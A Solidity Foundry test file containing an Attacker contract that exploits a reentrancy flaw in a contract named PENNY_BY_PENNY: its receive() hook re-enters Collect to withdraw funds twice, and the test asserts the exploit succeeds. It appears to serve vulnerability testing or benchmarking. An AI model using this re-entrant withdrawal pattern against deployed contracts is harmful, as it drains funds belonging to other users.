
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/PENNY_BY_PENNY.sol";

contract TestReentrancyPENNY_BY_PENNY is Test {
    PENNY_BY_PENNY public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PENNY_BY_PENNY();
        _contractUnderTest.SetLogFile(address(_logFile));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 1000);
        vm.assume(attackVal < type(uint128).max);

        uint256 totalDeposit = attackVal * 2;

        _contractUnderTest.SetMinSum(totalDeposit);
        _contractUnderTest.Initialized();

        vm.deal(address(this), totalDeposit);

        _attacker.setupAttack{value: totalDeposit}(totalDeposit);
        
        vm.warp(block.timestamp + 10);

        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public amount;

    constructor(address victimAddress) { 
        victim = PENNY_BY_PENNY(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        amount = val;
        initialSnapshot = address(this).balance;

        victim.Collect(amount);

        if (address(this).balance >= initialSnapshot + (amount * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            victim.Collect(amount);
        }
    }
}
